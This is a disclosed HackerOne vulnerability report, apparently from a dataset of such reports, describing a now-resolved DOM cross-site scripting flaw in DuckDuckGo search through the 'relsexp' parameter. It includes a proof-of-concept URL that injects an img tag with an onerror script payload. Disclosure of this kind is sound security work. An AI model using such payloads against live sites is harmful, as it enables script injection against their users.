---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '876148'
original_report_id: '876148'
title: DOM XSS on duckduckgo.com search
weakness: Cross-site Scripting (XSS) - Reflected
team_handle: duckduckgo
created_at: '2020-05-16T18:33:39.971Z'
disclosed_at: '2020-06-26T17:16:30.523Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 74
asset_identifier: '*.duckduckgo.com'
asset_type: WILDCARD
max_severity: critical
tags:
- hackerone
- cross-site-scripting-xss-reflected
---

# DOM XSS on duckduckgo.com search

## Metadata

- HackerOne Report ID: 876148
- Weakness: Cross-site Scripting (XSS) - Reflected
- Program: duckduckgo
- Disclosed At: 2020-06-26T17:16:30.523Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

Hello,
The is a DOM XSS vulnerability on https://duckduckgo.com search through the `relsexp` parameter.

PoC URL: ` https://duckduckgo.com/?q=a&relsexp="><img src=/ onerror=alert(document.domain)>&ia=web`

Screenshot:
{F830875}

Video:
{F830880}

## Impact

The attacker can execute JS code.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
